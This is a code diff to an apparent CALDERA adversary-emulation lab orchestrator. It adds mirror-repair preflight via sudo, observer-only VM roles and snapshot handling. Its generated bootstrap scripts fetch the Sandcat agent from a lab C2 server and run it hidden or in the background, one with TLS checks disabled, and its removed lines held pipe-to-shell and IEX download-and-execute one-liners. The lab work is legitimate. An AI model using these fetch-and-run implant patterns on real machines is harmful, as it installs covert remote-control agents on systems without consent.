@@ -30,11 +30,13 @@ import base64
 import json
 import os
 import re
+import shutil
 import shlex
 import ssl
 import subprocess
 import sys
 import tempfile
+import time
 import uuid
 import urllib.error
 import urllib.request
@@ -767,6 +769,7 @@ def load_lab_config(xdr_root: Path) -> dict[str, Any]:
     base["listen_port"] = int(cal.get("listen_port") or 8888)
     base["base_url"] = str(cal.get("base_url") or "http://127.0.0.1:8888")
     base["agent_base_url"] = str(cal.get("agent_base_url") or "http://10.10.10.1:8888")
+    base["_lab_vms"] = load_json(xdr_root / "config" / "lab-vms.json", {})
     return base
 
 
@@ -1447,6 +1450,8 @@ def compact_preflight_summary_for_record(pf: dict[str, Any]) -> dict[str, Any]:
         "live_gate_codes": [str(g.get("code") or "") for g in gates if isinstance(g, dict)],
         "mirror_consistent": mir.get("consistent"),
         "mirror_json_present": mir.get("mirror_json_present"),
+        "mirror_live_verify": mir.get("live_verify"),
+        "mirror_repair": mir.get("repair"),
         "expected_telemetry_count": s.get("expected_telemetry_count"),
     }
 
@@ -2008,6 +2013,310 @@ def load_mirror_doc(stated: Path) -> dict[str, Any]:
     return doc if isinstance(doc, dict) else {}
 
 
+MIRROR_SUDO_REPAIR_MESSAGE = (
+    "mirror repair requires sudo; run: sudo aella_cli lab mirror apply && sudo aella_cli lab mirror verify"
+)
+MIRROR_PREFLIGHT_CODES = frozenset(
+    {"mirror_json_missing", "mirror_inconsistent", "mirror_privilege_required"}
+)
+
+
+def _vm_manager_path(xdr_root: Path) -> Path:
+    return xdr_root / "scripts" / "xdr-lab-vm-manager.sh"
+
+
+def _mirror_command_summary(proc: subprocess.CompletedProcess[str] | None) -> dict[str, Any]:
+    if proc is None:
+        return {"rc": None, "stdout": "", "stderr": ""}
+    return {
+        "rc": int(proc.returncode),
+        "stdout": (proc.stdout or "")[-12000:],
+        "stderr": (proc.stderr or "")[-12000:],
+    }
+
+
+def _mirror_output_requires_privilege(proc: subprocess.CompletedProcess[str] | None) -> bool:
+    if proc is None:
+        return False
+    text = f"{proc.stdout or ''}\n{proc.stderr or ''}".lower()
+    if not any(tok in text for tok in ("ovs-vsctl", "ovsdb", "db.sock", "database connection")):
+        return False
+    return any(
+        tok in text
+        for tok in (
+            "permission denied",
+            "operation not permitted",
+            "access denied",
+            "must be root",
+            "are you root",
+            "insufficient privileges",
+        )
+    )
+
+
+def _aella_cli_path() -> str:
+    found = shutil.which("aella_cli")
+    if found:
+        return found
+    for candidate in ("/usr/local/bin/aella_cli", "/usr/bin/aella_cli"):
+        if Path(candidate).is_file():
+            return candidate
+    return "aella_cli"
+
+
+def _sudo_noninteractive_available() -> bool:
+    if os.geteuid() == 0:
+        return True
+    if not shutil.which("sudo"):
+        return False
+    proc = subprocess.run(["sudo", "-n", "true"], capture_output=True, text=True, check=False)
+    return int(proc.returncode) == 0
+
+
+def _run_vm_manager_mirror(
+    xdr_root: Path,
+    subcommand: str,
+    *,
+    log_path: Path | None,
+    scenario_name: str,
+    run_id: str,
+) -> subprocess.CompletedProcess[str]:
+    vm_mgr = _vm_manager_path(xdr_root)
+    proc = subprocess.run(
+        [str(vm_mgr), "mirror", subcommand],
+        capture_output=True,
+        text=True,
+        check=False,
+    )
+    if log_path:
+        log_jsonl(
+            log_path,
+            "scenario_mirror_preflight_command",
+            scenario=scenario_name,
+            run_id=run_id,
+            subcommand=subcommand,
+            rc=int(proc.returncode),
+            stdout=(proc.stdout or "")[-12000:],
+            stderr=(proc.stderr or "")[-12000:],
+        )
+    return proc
+
+
+def _run_aella_cli_mirror(
+    xdr_root: Path,
+    subcommand: str,
+    *,
+    use_sudo: bool,
+    log_path: Path | None,
+    scenario_name: str,
+    run_id: str,
+) -> subprocess.CompletedProcess[str]:
+    env = os.environ.copy()
+    env.update(
+        {
+            "XDR_ROOT": str(xdr_root),
+            "XDR_BASE": str(xdr_root),
+            "XDR_LAB_MANAGER": str(_vm_manager_path(xdr_root)),
+        }
+    )
+    cli = _aella_cli_path()
+    if use_sudo:
+        argv = [
+            "sudo",
+            "-n",
+            "env",
+            f"XDR_ROOT={xdr_root}",
+            f"XDR_BASE={xdr_root}",
+            f"XDR_LAB_MANAGER={_vm_manager_path(xdr_root)}",
+            cli,
+            "lab",
+            "mirror",
+            subcommand,
+        ]
+    else:
+        argv = [cli, "lab", "mirror", subcommand]
+    try:
+        proc = subprocess.run(argv, capture_output=True, text=True, check=False, env=env)
+    except FileNotFoundError as exc:
+        proc = subprocess.CompletedProcess(argv, 127, "", str(exc))
+    if log_path:
+        log_jsonl(
+            log_path,
+            "scenario_mirror_preflight_command",
+            scenario=scenario_name,
+            run_id=run_id,
+            subcommand=subcommand,
+            command=" ".join(shlex.quote(x) for x in argv),
+            used_sudo=use_sudo,
+            rc=int(proc.returncode),
+            stdout=(proc.stdout or "")[-12000:],
+            stderr=(proc.stderr or "")[-12000:],
+        )
+    return proc
+
+
+def refresh_mirror_state_from_live_ovs(
+    xdr_root: Path,
+    *,
+    log_path: Path | None,
+    scenario_name: str,
+    run_id: str,
+    use_sudo: bool = False,
+) -> dict[str, Any]:
+    """Refresh mirror.json from live virsh/OVS reality; non-zero is diagnostic."""
+    vm_mgr = _vm_manager_path(xdr_root)
+    if not vm_mgr.is_file():
+        return {"rc": None, "stdout": "", "stderr": "", "privilege_required": False}
+    if use_sudo:
+        proc = _run_aella_cli_mirror(
+            xdr_root,
+            "verify",
+            use_sudo=True,
+            log_path=log_path,
+            scenario_name=scenario_name,
+            run_id=run_id,
+        )
+    else:
+        proc = _run_vm_manager_mirror(
+            xdr_root,
+            "verify",
+            log_path=log_path,
+            scenario_name=scenario_name,
+            run_id=run_id,
+        )
+    summary = _mirror_command_summary(proc)
+    summary["privilege_required"] = (
+        int(proc.returncode) != 0 and _mirror_output_requires_privilege(proc)
+    )
+    summary["used_sudo"] = use_sudo
+    return summary
+
+
+def _preflight_has_mirror_gate(pf: dict[str, Any]) -> bool:
+    for key in ("blocking", "operator_live_gate_failures"):
+        rows = pf.get(key)
+        if not isinstance(rows, list):
+            continue
+        for row in rows:
+            if isinstance(row, dict) and str(row.get("code") or "") in MIRROR_PREFLIGHT_CODES:
+                return True
+    return False
+
+
+def _emit_mirror_command_output(label: str, proc: subprocess.CompletedProcess[str]) -> None:
+    out = (proc.stdout or "").strip()
+    err = (proc.stderr or "").strip()
+    print(f"--- lab mirror {label} rc={int(proc.returncode)} stdout ---")
+    print(out if out else "(empty)")
+    print(f"--- lab mirror {label} rc={int(proc.returncode)} stderr ---")
+    print(err if err else "(empty)")
+
+
+def repair_mirror_for_scenario_preflight(
+    xdr_root: Path,
+    stated: Path,
+    *,
+    log_path: Path | None,
+    scenario_name: str,
+    run_id: str,
+    is_dry: bool,
+) -> dict[str, Any]:
+    """Auto-repair stale OVS mirror state before a live scenario run."""
+    mir = load_mirror_doc(stated)
+    mirror_exists = mir.get("mirror_exists") if (stated / "mirror.json").is_file() else False
+    consistent = mir.get("consistent") if (stated / "mirror.json").is_file() else False
+    print("")
+    print("[OVS mirror]")
+    print(f"consistent={str(bool(consistent)).lower()} mirror_exists={str(bool(mirror_exists)).lower()}")
+    if is_dry:
+        print("auto-repair: skipped in dry-run")
+        print("suggestion: run `sudo aella_cli lab mirror apply && sudo aella_cli lab mirror verify`, or rerun live scenario to auto-repair")
+        if log_path:
+            log_jsonl(
+                log_path,
+                "scenario_mirror_preflight_repair_skipped",
+                scenario=scenario_name,
+                run_id=run_id,
+                dry_run=True,
+            )
+        return {"repaired": False, "dry_run": True, "apply": None, "verify": None}
+
+    if not _vm_manager_path(xdr_root).is_file():
+        print(f"auto-repair: FAIL (vm-manager missing: {_vm_manager_path(xdr_root)})")
+        return {"repaired": False, "reason": "vm_manager_missing", "apply": None, "verify": None}
+
+    use_sudo = os.geteuid() != 0
+    if use_sudo and not _sudo_noninteractive_available():
+        print(f"auto-repair: FAIL ({MIRROR_SUDO_REPAIR_MESSAGE})")
+        result = {
+            "repaired": False,
+            "reason": "sudo_unavailable",
+            "required_sudo": True,
+            "used_sudo": False,
+            "abort_message": MIRROR_SUDO_REPAIR_MESSAGE,
+            "apply": None,
+            "verify": None,
+        }
+        if log_path:
+            log_jsonl(
+                log_path,
+                "scenario_mirror_preflight_repair_completed",
+                scenario=scenario_name,
+                run_id=run_id,
+                apply_rc=None,
+                verify_rc=None,
+                repaired=False,
+                required_sudo=True,
+                used_sudo=False,
+                reason="sudo_unavailable",
+                abort_message=MIRROR_SUDO_REPAIR_MESSAGE,
+            )
+        return result
+
+    print(f"auto-repair: applying mirror{' via sudo' if use_sudo else ''}")
+    apply_proc = _run_aella_cli_mirror(
+        xdr_root,
+        "apply",
+        use_sudo=use_sudo,
+        log_path=log_path,
+        scenario_name=scenario_name,
+        run_id=run_id,
+    )
+    _emit_mirror_command_output("apply", apply_proc)
+    verify_proc = _run_aella_cli_mirror(
+        xdr_root,
+        "verify",
+        use_sudo=use_sudo,
+        log_path=log_path,
+        scenario_name=scenario_name,
+        run_id=run_id,
+    )
+    _emit_mirror_command_output("verify", verify_proc)
+    ok = int(apply_proc.returncode) == 0 and int(verify_proc.returncode) == 0
+    print(f"auto-repair: verify {'PASS' if ok else 'FAIL'}")
+    if ok:
+        print("continuing scenario run")
+    if log_path:
+        log_jsonl(
+            log_path,
+            "scenario_mirror_preflight_repair_completed",
+            scenario=scenario_name,
+            run_id=run_id,
+            apply_rc=int(apply_proc.returncode),
+            verify_rc=int(verify_proc.returncode),
+            repaired=ok,
+            required_sudo=use_sudo,
+            used_sudo=use_sudo,
+        )
+    return {
+        "repaired": ok,
+        "required_sudo": use_sudo,
+        "used_sudo": use_sudo,
+        "apply": _mirror_command_summary(apply_proc),
+        "verify": _mirror_command_summary(verify_proc),
+    }
+
+
 def load_snapshots_catalog_doc(stated: Path) -> dict[str, Any]:
     doc = load_json(stated / "snapshots.json", {})
     return doc if isinstance(doc, dict) else {}
@@ -2025,8 +2334,16 @@ def collect_scenario_run_preflight(
     snapshot_before: bool,
     is_dry: bool,
     log_path: Path | None,
+    mirror_verify_use_sudo: bool = False,
 ) -> dict[str, Any]:
     """Read-only preflight facts for `scenario run` (no CALDERA mutations)."""
+    mirror_live_verify = refresh_mirror_state_from_live_ovs(
+        xdr_root,
+        log_path=log_path,
+        scenario_name=scenario_name,
+        run_id=run_id,
+        use_sudo=mirror_verify_use_sudo,
+    )
     base_url = str(cfg.get("base_url") or "http://127.0.0.1:8888").strip()
     api_key = resolve_api_key(cfg, xdr_root=xdr_root)
     api_key_ok = bool(api_key.strip())
@@ -2202,6 +2519,9 @@ def collect_scenario_run_preflight(
 
     for vm in target_vms:
         vm = str(vm).strip()
+        if vm and not vm_requires_caldera_agent(cfg, vm):
+            add_warn(f"observer_target:{vm}", f"{vm!r} is observer-only; CALDERA agent absence is not a live gate.")
+            continue
         if vm and not matrix.get(vm):
             add_live_gate(
                 f"target_agent_missing:{vm}",
@@ -2249,7 +2569,15 @@ def collect_scenario_run_preflight(
         for m in row.get("nat_vm_messages") or []:
             add_live_gate(f"nat_vm:{row.get('vm')}", str(m))
 
-    if not mirror_file:
+    mirror_verify_rc = mirror_live_verify.get("rc")
+    mirror_verify_ok = isinstance(mirror_verify_rc, int) and mirror_verify_rc == 0
+    mirror_privilege_required = bool(mirror_live_verify.get("privilege_required")) and not mirror_verify_ok
+    if mirror_privilege_required:
+        add_live_gate(
+            "mirror_privilege_required",
+            MIRROR_SUDO_REPAIR_MESSAGE,
+        )
+    elif not mirror_file:
         add_live_gate(
             "mirror_json_missing",
             "runtime/state/mirror.json missing — run `xdr-lab-vm-manager.sh mirror status` / refresh first.",
@@ -2290,9 +2618,12 @@ def collect_scenario_run_preflight(
         "target_vm_reachability": vm_reach,
         "mirror": {
             "mirror_json_present": mirror_file,
+            "live_verify_rc": mirror_live_verify.get("rc"),
+            "live_verify": mirror_live_verify,
             "consistent": mirror_consistent if mirror_file else None,
             "sensor_vm": mirror_doc.get("sensor_vm"),
             "mirror_exists": mirror_doc.get("mirror_exists"),
+            "privilege_required": mirror_privilege_required,
         },
         "snapshots_catalog": {
             "path": str(stated / "snapshots.json"),
@@ -2340,6 +2671,7 @@ def log_scenario_preflight_jsonl(
 def print_scenario_run_preflight_stdout(
     pf: dict[str, Any],
     *,
+    cfg: dict[str, Any],
     operation_name: str,
     adversary_id: Any,
     group: str,
@@ -2375,6 +2707,8 @@ def print_scenario_run_preflight_stdout(
     mx = s.get("agent_matrix") if isinstance(s.get("agent_matrix"), dict) else {}
     for k, v in mx.items():
         print(f"  - {k}: {'connected' if v else 'not connected'}")
+    for k in observer_only_agent_roles(cfg):
+        print(f"  - {k}: observer_only / skipped")
     print("")
     print("[Target VM reachability + NAT per-VM]")
     for row in s.get("target_vm_reachability") or []:
@@ -2395,8 +2729,10 @@ def print_scenario_run_preflight_stdout(
             f"  consistent={mir.get('consistent')}  sensor_vm={mir.get('sensor_vm')!r}  "
             f"mirror_exists={mir.get('mirror_exists')}"
         )
+        if mir.get("live_verify_rc") is not None:
+            print(f"  live verify rc={mir.get('live_verify_rc')} (source of truth: virsh + ovs-vsctl)")
     else:
-        print("  mirror.json missing — a state file may be needed before `lab mirror verify`")
+        print("  mirror.json missing — live verify could not materialize a state file")
     sn = s.get("snapshots_catalog") if isinstance(s.get("snapshots_catalog"), dict) else {}
     print("")
     print("[Snapshot catalog — runtime/state/snapshots.json]")
@@ -3029,8 +3365,8 @@ def agent_matches(row: dict[str, Any], substrings: list[str]) -> bool:
     return any(s.lower() in hay for s in substrings if s)
 
 
-def agent_vm_roles(cfg: dict[str, Any]) -> list[str]:
-    """VM names that participate in CALDERA agent deploy/status (caldera-lab.json::agents)."""
+def configured_agent_roles(cfg: dict[str, Any]) -> list[str]:
+    """VM names listed for CALDERA agent visibility before role-policy filtering."""
     raw = cfg.get("agents")
     if not isinstance(raw, dict):
         return ["sensor-vm", "victim-linux", "windows-victim"]
@@ -3052,6 +3388,42 @@ def agent_vm_roles(cfg: dict[str, Any]) -> list[str]:
             continue
         ordered.append(name)
     return ordered or ["sensor-vm", "victim-linux", "windows-victim"]
+
+
+def lab_vm_policy_entry(cfg: dict[str, Any], vm: str) -> dict[str, Any]:
+    lab = cfg.get("_lab_vms")
+    if not isinstance(lab, dict):
+        return {}
+    vms = lab.get("vms")
+    if not isinstance(vms, dict):
+        return {}
+    row = vms.get(vm)
+    return row if isinstance(row, dict) else {}
+
+
+def vm_requires_caldera_agent(cfg: dict[str, Any], vm: str) -> bool:
+    """Role-based CALDERA agent policy from lab-vms.json, with legacy config fallback."""
+    entry = lab_vm_policy_entry(cfg, vm)
+    spec = agent_spec_for_vm(cfg, vm)
+    role = str(entry.get("role") or spec.get("role") or "").strip().lower()
+    if role in ("observer", "observer_only"):
+        return False
+    for key in ("observer_only",):
+        if entry.get(key) is True or spec.get(key) is True:
+            return False
+    for key in ("requires_caldera_agent", "requires_agent"):
+        if entry.get(key) is False or spec.get(key) is False:
+            return False
+    return True
+
+
+def observer_only_agent_roles(cfg: dict[str, Any]) -> list[str]:
+    return [vm for vm in configured_agent_roles(cfg) if not vm_requires_caldera_agent(cfg, vm)]
+
+
+def agent_vm_roles(cfg: dict[str, Any]) -> list[str]:
+    """VM names that require CALDERA Sandcat agents for live scenario gates."""
+    return [vm for vm in configured_agent_roles(cfg) if vm_requires_caldera_agent(cfg, vm)]
 
 
 def build_agent_matrix(
@@ -3243,7 +3615,13 @@ def find_agent_paws(cfg: dict[str, Any], agents: list[dict[str, Any]], vm: str) 
     return paws
 
 
-def write_agent_bootstraps(xdr_root: Path, agent_base_url: str, log_path: Path | None) -> None:
+def write_agent_bootstraps(
+    xdr_root: Path,
+    agent_base_url: str,
+    log_path: Path | None,
+    *,
+    group: str = "red",
+) -> None:
     """Emit Sandcat-style bootstrap hints (operator runs on victim VMs)."""
     out_dir = xdr_root / "runtime" / "caldera-agent"
     out_dir.mkdir(parents=True, exist_ok=True)
@@ -3251,27 +3629,40 @@ def write_agent_bootstraps(xdr_root: Path, agent_base_url: str, log_path: Path |
     invalid_reason = agent_base_url_invalid_reason(bu)
     if invalid_reason:
         raise ValueError(f"caldera_agent_url_invalid: {invalid_reason}")
-    # CALDERA standard Sandcat one-liners (HTTP contact); operator must pick correct binary in UI if needed.
+    grp = (group or "red").strip() or "red"
+    # CALDERA Sandcat downloads are selected through request headers, not URL suffixes.
     ps1 = out_dir / "bootstrap-windows.ps1"
     sh = out_dir / "bootstrap-linux.sh"
     ps1.write_text(
-        f"""# Generated by caldera_orchestration.py — run on Windows victim (elevated if required).
+        f"""# Generated by caldera_orchestration.py - run on Windows victim (elevated if required).
 $server="{bu}"
-# Typical Sandcat pull (plugin / deployment may vary — verify in CALDERA UI if this fails):
-try {{
-  IEX (New-Object Net.WebClient).DownloadString("$server/file/download/sandcat.go")
-}} catch {{
-  Write-Error $_
-}}
+$group="{grp}"
+$out=Join-Path $env:TEMP "xdr-lab-sandcat.exe"
+$wc=New-Object Net.WebClient
+$wc.Headers.Add("file","sandcat.go")
+$wc.Headers.Add("platform","windows")
+$wc.Headers.Add("server",$server)
+$wc.Headers.Add("group",$group)
+$wc.DownloadFile("$server/file/download", $out)
+Start-Process -FilePath $out -ArgumentList @("-server", $server, "-group", $group) -WindowStyle Hidden
 """,
         encoding="utf-8",
     )
     sh.write_text(
         f"""#!/bin/sh
-# Generated by caldera_orchestration.py — run on Linux victim.
+# Generated by caldera_orchestration.py - run on Linux victim.
 set -e
 SERVER="{bu}"
-curl -fsSL "$SERVER/file/download/sandcat.go" | python3 - 2>/dev/null || curl -fsSL "$SERVER/file/download/sandcat.sh" | sh
+GROUP="{grp}"
+OUT="${{TMPDIR:-/tmp}}/xdr-lab-sandcat"
+curl -fsSk -X POST \\
+  -H "file:sandcat.go" \\
+  -H "platform:linux" \\
+  -H "server:${{SERVER}}" \\
+  -H "group:${{GROUP}}" \\
+  "$SERVER/file/download" > "$OUT"
+chmod 700 "$OUT"
+nohup "$OUT" -server "$SERVER" -group "$GROUP" >/tmp/xdr-lab-sandcat.log 2>&1 &
 """,
         encoding="utf-8",
     )
@@ -3637,15 +4028,47 @@ def run_lab_snapshot_batch_create(
     env = os.environ.copy()
     env.setdefault("XDR_BASE", str(xdr_root))
     env.setdefault("XDR_ROOT", str(xdr_root))
-    proc = subprocess.run(
-        ["bash", str(mgr), "snapshot", "create", nm],
-        cwd=str(xdr_root),
-        env=env,
-        capture_output=True,
-        text=True,
-    )
-    rc = int(proc.returncode or 0)
-    err_tail = (proc.stderr or "")[-4000:]
+    targets = list(dict.fromkeys(str(vm).strip() for vm in target_vms if str(vm).strip()))
+    if not targets:
+        targets = []
+    outputs: list[str] = []
+    errors: list[str] = []
+    per_vm: dict[str, int] = {}
+    rc = 0
+    if targets:
+        for vm in targets:
+            proc = subprocess.run(
+                ["bash", str(mgr), "snapshot", "create", vm, nm],
+                cwd=str(xdr_root),
+                env=env,
+                capture_output=True,
+                text=True,
+            )
+            vm_rc = int(proc.returncode or 0)
+            per_vm[vm] = vm_rc
+            if vm_rc != 0 and rc == 0:
+                rc = vm_rc
+            if proc.stdout:
+                outputs.append(proc.stdout)
+            if proc.stderr:
+                errors.append(proc.stderr)
+    else:
+        proc = subprocess.run(
+            ["bash", str(mgr), "snapshot", "create", nm],
+            cwd=str(xdr_root),
+            env=env,
+            capture_output=True,
+            text=True,
+        )
+        rc = int(proc.returncode or 0)
+        per_vm = {"<batch>": rc}
+        if proc.stdout:
+            outputs.append(proc.stdout)
+        if proc.stderr:
+            errors.append(proc.stderr)
+    stdout_text = "".join(outputs)
+    stderr_text = "".join(errors)
+    err_tail = stderr_text[-4000:]
     if log_path:
         if rc == 0:
             log_jsonl(
@@ -3655,6 +4078,8 @@ def run_lab_snapshot_batch_create(
                 scenario=scenario_name,
                 snapshot_name=nm,
                 rc=rc,
+                target_vms=targets or target_vms,
+                per_vm=per_vm,
                 dry_run=dry_run,
             )
         else:
@@ -3665,12 +4090,14 @@ def run_lab_snapshot_batch_create(
                 scenario=scenario_name,
                 snapshot_name=nm,
                 rc=rc,
+                target_vms=targets or target_vms,
+                per_vm=per_vm,
                 stderr_tail=err_tail.strip() or None,
             )
-    if proc.stdout:
-        sys.stdout.write(proc.stdout)
-    if proc.stderr:
-        sys.stderr.write(proc.stderr)
+    if stdout_text:
+        sys.stdout.write(stdout_text)
+    if stderr_text:
+        sys.stderr.write(stderr_text)
     return rc, err_tail
 
 
@@ -4338,6 +4765,51 @@ def cmd_run(
         is_dry=is_dry,
         log_path=log_path,
     )
+    mirror_repair_summary: dict[str, Any] | None = None
+    if _preflight_has_mirror_gate(pf):
+        mirror_repair_summary = repair_mirror_for_scenario_preflight(
+            xdr_root,
+            stated,
+            log_path=log_path,
+            scenario_name=scenario_name,
+            run_id=run_id,
+            is_dry=is_dry,
+        )
+        if mirror_repair_summary.get("repaired"):
+            pf = collect_scenario_run_preflight(
+                xdr_root,
+                stated,
+                cfg,
+                scenario_name=scenario_name,
+                run_id=run_id,
+                rs=rs,
+                target_vms=target_vms,
+                snapshot_before=snapshot_before,
+                is_dry=is_dry,
+                log_path=log_path,
+                mirror_verify_use_sudo=bool(mirror_repair_summary.get("used_sudo")),
+            )
+        summary = pf.get("summary") if isinstance(pf.get("summary"), dict) else None
+        mirror_summary = summary.get("mirror") if isinstance(summary, dict) else None
+        if isinstance(mirror_summary, dict):
+            mirror_summary["repair"] = mirror_repair_summary
+        if mirror_repair_summary.get("reason") == "sudo_unavailable":
+            privilege_block = {"code": "mirror_privilege_required", "message": MIRROR_SUDO_REPAIR_MESSAGE}
+            for key in ("blocking", "operator_live_gate_failures"):
+                rows = pf.get(key)
+                if not isinstance(rows, list):
+                    continue
+                pf[key] = [
+                    privilege_block,
+                    *[
+                        row
+                        for row in rows
+                        if not (
+                            isinstance(row, dict)
+                            and str(row.get("code") or "") in MIRROR_PREFLIGHT_CODES
+                        )
+                    ],
+                ]
     warns_raw = pf.get("warnings") if isinstance(pf.get("warnings"), list) else []
     blocks_raw = pf.get("blocking") if isinstance(pf.get("blocking"), list) else []
     for w in warns_raw:
@@ -4410,6 +4882,7 @@ def cmd_run(
             log_caldera_auth_journal()
         print_scenario_run_preflight_stdout(
             pf,
+            cfg=cfg,
             operation_name=op_name,
             adversary_id=adversary_id,
             group=group,
@@ -4500,6 +4973,7 @@ def cmd_run(
     if not is_dry:
         print_scenario_run_preflight_stdout(
             pf,
+            cfg=cfg,
             operation_name=op_name,
             adversary_id=adversary_id,
             group=group,
@@ -4757,6 +5231,7 @@ def cmd_run(
         }
         print_scenario_run_preflight_stdout(
             pf,
+            cfg=cfg,
             operation_name=op_name,
             adversary_id=adversary_id,
             group=group,
@@ -5465,6 +5940,8 @@ def cmd_agent_status(
                 "      → remediation: agent not seen by CALDERA — "
                 f"run `scenario agent deploy`, wait briefly, and align agent_vm_map.host_substrings with real hostnames."
             )
+    for vm in observer_only_agent_roles(cfg):
+        print(f"  - {vm}: OBSERVER_ONLY (observer VM; Sandcat is not required)")
 
     dep = caldera_doc.get("agent_deploy_last")
     if isinstance(dep, dict) and dep.get("utc"):
@@ -5504,6 +5981,34 @@ def cmd_agent_status(
     return 0
 
 
+def caldera_restart_grace_active(xdr_root: Path, *, grace_secs: int = 60) -> bool:
+    """Return true shortly after a CALDERA restart, when Sandcat reconnects may lag."""
+    candidates = [
+        xdr_root / "scripts" / "caldera_process_util.py",
+        _SCRIPT_DIR / "caldera_process_util.py",
+    ]
+    util = next((p for p in candidates if p.is_file()), None)
+    if util is None:
+        return False
+    try:
+        proc = subprocess.run(
+            [
+                sys.executable,
+                str(util),
+                "grace-active",
+                "--grace-secs",
+                str(grace_secs),
+            ],
+            stdout=subprocess.DEVNULL,
+            stderr=subprocess.DEVNULL,
+            timeout=5,
+            check=False,
+        )
+    except (OSError, subprocess.TimeoutExpired):
+        return False
+    return proc.returncode == 0
+
+
 def cmd_agent_verify(
     cfg: dict[str, Any], stated: Path, log_path: Path | None, *, json_only: bool
 ) -> int:
@@ -5513,13 +6018,29 @@ def cmd_agent_verify(
     if not isinstance(matrix, dict):
         matrix = scenario_doc.get("agents") if isinstance(scenario_doc.get("agents"), dict) else {}
     roles = agent_vm_roles(cfg)
+    observers = observer_only_agent_roles(cfg)
     disconnected = [vm for vm in roles if not bool(matrix.get(vm))]
+    reconnect_grace_used = False
+    reconnect_wait_seconds = int(os.environ.get("XDR_LAB_AGENT_RECONNECT_GRACE_SECS", "60") or "60")
+    reconnect_poll_seconds = int(os.environ.get("XDR_LAB_AGENT_RECONNECT_POLL_SECS", "3") or "3")
+    if disconnected and caldera_restart_grace_active(xdr_root, grace_secs=reconnect_wait_seconds):
+        reconnect_grace_used = True
+        deadline = time.monotonic() + max(1, reconnect_wait_seconds)
+        while disconnected and time.monotonic() < deadline:
+            time.sleep(max(1, reconnect_poll_seconds))
+            scenario_doc, caldera_doc = refresh_state(xdr_root, stated, cfg, log_path=log_path)
+            matrix = caldera_doc.get("agent_matrix_last")
+            if not isinstance(matrix, dict):
+                matrix = scenario_doc.get("agents") if isinstance(scenario_doc.get("agents"), dict) else {}
+            disconnected = [vm for vm in roles if not bool(matrix.get(vm))]
     payload = {
         "result": "PASS" if not disconnected else "FAIL",
         "roles": roles,
+        "observer_only": observers,
         "connected": [vm for vm in roles if bool(matrix.get(vm))],
         "disconnected": disconnected,
         "matrix": {vm: bool(matrix.get(vm)) for vm in roles},
+        "reconnect_grace_used": reconnect_grace_used,
     }
     scenario_doc["agents"] = payload["matrix"]
     save_json_atomic(stated / "scenario.json", scenario_doc)
@@ -5527,6 +6048,10 @@ def cmd_agent_verify(
         print(json.dumps(payload, indent=2, ensure_ascii=False))
     else:
         print("=== CALDERA lab — agent verify ===")
+        if reconnect_grace_used:
+            print(f"[INFO] caldera restart detected; polled for Sandcat reconnect up to {reconnect_wait_seconds}s")
+        for vm in observers:
+            print(f"[OBSERVER_ONLY] {vm}")
         for vm in roles:
             print(f"[{'PASS' if bool(matrix.get(vm)) else 'FAIL'}] {vm}")
         print(f"RESULT: {payload['result']}")
@@ -5617,7 +6142,12 @@ def cmd_agent_deploy(
         else:
             print("[failure] CALDERA API key missing (preflight fatal — non-dry-run exits with code 2)")
             print("  → remediation: set XDR_CALDERA_API_KEY, caldera-lab.json api_key_file, or api_key_env.")
-            write_agent_bootstraps(xdr_root, agent_base_url, log_path)
+            write_agent_bootstraps(
+                xdr_root,
+                agent_base_url,
+                log_path,
+                group=str(cfg.get("default_group") or "red").strip() or "red",
+            )
             exit_final = finalize_agent_deploy_report(
                 deploy_report,
                 is_dry=False,
@@ -5659,7 +6189,12 @@ def cmd_agent_deploy(
         linux_body = ""
         ps1_body = ""
     else:
-        write_agent_bootstraps(xdr_root, agent_base_url, log_path)
+        write_agent_bootstraps(
+            xdr_root,
+            agent_base_url,
+            log_path,
+            group=str(cfg.get("default_group") or "red").strip() or "red",
+        )
         linux_body = sh_path.read_text(encoding="utf-8") if sh_path.is_file() else ""
         ps1_body = ps1_path.read_text(encoding="utf-8") if ps1_path.is_file() else ""
 
@@ -5957,6 +6492,24 @@ def cmd_agent_remove(cfg: dict[str, Any], stated: Path, log_path: Path | None) -
 # --- Atomic Red Team — per-VM validate (victim-linux / windows-victim) ---
 
 ATOMIC_VALIDATE_VM_ROLES: tuple[str, ...] = ("victim-linux", "windows-victim")
+ATOMIC_VALIDATE_VM_ROLE_SET = frozenset(ATOMIC_VALIDATE_VM_ROLES)
+
+
+def atomic_validate_vm_roles(cfg: dict[str, Any]) -> tuple[str, ...]:
+    raw = os.environ.get("XDR_LAB_ATOMIC_VALIDATE_ROLES", "").strip()
+    if not raw:
+        art = cfg.get("atomic_red_team") if isinstance(cfg.get("atomic_red_team"), dict) else {}
+        cfg_raw = art.get("validate_roles") if isinstance(art, dict) else None
+        if isinstance(cfg_raw, list):
+            roles = [str(v).strip() for v in cfg_raw if str(v).strip()]
+        else:
+            roles = []
+    else:
+        roles = [v.strip() for v in re.split(r"[,\s]+", raw) if v.strip()]
+    if not roles:
+        return ATOMIC_VALIDATE_VM_ROLES
+    picked = tuple(v for v in roles if v in ATOMIC_VALIDATE_VM_ROLE_SET)
+    return picked or ATOMIC_VALIDATE_VM_ROLES
 
 
 def atomic_red_team_bootstrap_paths(xdr_root: Path) -> tuple[Path, Path]:
@@ -6537,7 +7090,8 @@ def run_atomic_red_team_validate(
 ) -> dict[str, Any]:
     lab = load_lab_vms_json(xdr_root)
     vms: list[dict[str, Any]] = []
-    for role in ATOMIC_VALIDATE_VM_ROLES:
+    roles = atomic_validate_vm_roles(cfg)
+    for role in roles:
         if role == "victim-linux":
             vms.append(validate_linux_server_atomic(xdr_root, cfg, lab))
         elif role == "windows-victim":
@@ -6553,6 +7107,7 @@ def run_atomic_red_team_validate(
             "linux_repo_path": str(art.get("linux_repo_path") or "").strip(),
             "windows_repo_path": str(art.get("windows_repo_path") or "").strip(),
         },
+        "validate_roles": list(roles),
     }
 
 
@@ -7037,11 +7592,13 @@ def build_active_agent_summary(
     if isinstance(matrix_last, dict) and matrix_last:
         agents = matrix_last
     roles = agent_vm_roles(cfg)
+    observers = observer_only_agent_roles(cfg)
     connected = [vm for vm in roles if bool(agents.get(vm))]
     disconnected = [vm for vm in roles if not bool(agents.get(vm))]
     dep = caldera.get("agent_deploy_last") if isinstance(caldera.get("agent_deploy_last"), dict) else {}
     return {
         "roles": roles,
+        "observer_only": observers,
         "connected": connected,
         "disconnected": disconnected,
         "matrix": {str(k): bool(v) for k, v in agents.items()},
@@ -7401,28 +7958,95 @@ def generate_evidence_bundle(xdr_root: Path, stated: Path, out_dir: Path, cfg: d
 
     ts = datetime.now(timezone.utc).strftime("%Y%m%dT%H%M%SZ")
